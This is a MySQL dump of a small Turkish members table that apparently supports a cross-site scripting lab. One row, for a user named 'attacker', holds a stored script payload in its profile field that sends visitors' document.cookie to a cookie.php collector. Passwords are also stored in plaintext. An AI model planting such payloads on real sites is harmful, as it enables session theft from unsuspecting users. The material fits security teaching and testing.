#
************************************************************
# Sequel Pro SQL dump
# Version 4541
#
# http://www.sequelpro.com/
# https://github.com/sequelpro/sequelpro
#
# Host: 127.0.0.1 (MySQL 5.6.35)
# Database: test1
# Generation Time: 2018-01-30 23:51:56 +0000
# ************************************************************


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


#
Dump of table uyeler
# ------------------------------------------------------------

DROP TABLE IF EXISTS `uyeler`;

CREATE TABLE `uyeler`
(
    `id`       int(11) NOT NULL AUTO_INCREMENT,
    `kadi`     varchar(255) NOT NULL,
    `sifre`    varchar(255) NOT NULL,
    `eposta`   varchar(255) NOT NULL,
    `hakkinda` text         NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

LOCK
TABLES `uyeler` WRITE;
/*!40000 ALTER TABLE `uyeler` DISABLE KEYS */;

INSERT INTO `uyeler` (`id`, `kadi`, `sifre`, `eposta`, `hakkinda`)
VALUES (1, 'ahmethan', '123123', 'ucmazahmethann@gmail.com', 'hakkımda'),
       (2, 'attacker', 'hakyiyenhackyer', 'attacker@attacker.com',
        '<script>window.location.href = \'cookie/cookie.php?cookie=\' + document.cookie;</script>');

/*!40000 ALTER TABLE `uyeler` ENABLE KEYS */;
UNLOCK
TABLES;



/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
